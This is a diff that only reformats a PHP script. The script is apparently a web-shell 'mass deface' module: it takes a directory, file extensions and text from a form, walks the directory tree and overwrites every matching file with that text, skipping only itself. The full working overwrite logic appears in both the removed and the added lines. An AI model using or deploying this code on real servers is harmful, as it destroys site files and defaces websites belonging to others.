@@ -74,41 +74,48 @@
 	</form>
 <?php
 if (isset($_POST['submit'])) {
-	for ($i=0; $i < count($_POST['ext']) ; $i++) { 
-		$plod = explode(" ", $_POST['ext'][$i]);
-		foreach ($plod as $data) {
-			if ($data) { ?>
+    for ($i = 0; $i < count($_POST['ext']); $i++) {
+        $plod = explode(" ", $_POST['ext'][$i]);
+        foreach ($plod as $data) {
+            if ($data) { ?>
 				<tr>
 					<td>
 						<b><?= $data ?></b>
 					</td>
 				</tr>
-				<?php mass($_POST['dir'], $data, $_POST['text']);
-			}
-		}
-	}
+				<?php mass($_POST['dir'], $data, $_POST['text']);}
+        }
+    }
 }
-function listFile($dir, &$output = array()) {
-	foreach (scandir($dir) as $key => $value) {
-		$location = $dir.DIRECTORY_SEPARATOR.$value;
-		if (!is_dir($location)) {
-			$output[] = $location;
-		} elseif ($value != "." && $value != '..') {
-			listFile($location, $output);
-			$output[] = $location;
-		}
-	} return $output;
+function listFile($dir, &$output = [])
+{
+    foreach (scandir($dir) as $key => $value) {
+        $location = $dir . DIRECTORY_SEPARATOR . $value;
+        if (!is_dir($location)) {
+            $output[] = $location;
+        } elseif ($value != "." && $value != '..') {
+            listFile($location, $output);
+            $output[] = $location;
+        }
+    }
+    return $output;
 }
 
-function mass($dir, $extension, $text) {
-	if (is_writable($dir)) {
-		foreach (listFile($dir) as $key => $value) {
-			$ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
-			switch ($ext) {
-				case $extension:
-					if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
-						if (file_put_contents($value, $text)) {
-							?>
+function mass($dir, $extension, $text)
+{
+    if (is_writable($dir)) {
+        foreach (listFile($dir) as $key => $value) {
+            $ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
+            switch ($ext) {
+                case $extension:
+                    if (
+                        preg_match(
+                            '/' . basename($value) . "$/i",
+                            $_SERVER['PHP_SELF'],
+                            $matches
+                        ) == 0
+                    ) {
+                        if (file_put_contents($value, $text)) { ?>
 							<tr>
 								<td>
 									<div class="alert">
@@ -116,13 +123,12 @@ function mass($dir, $extension, $text) {
 									</div>
 								</td>
 							</tr>
-						<?php
-						}
-					}
-				break;
-			}
-		}
-	}
-} 
+						<?php }
+                    }
+                    break;
+            }
+        }
+    }
+}
 ?>
 </table>
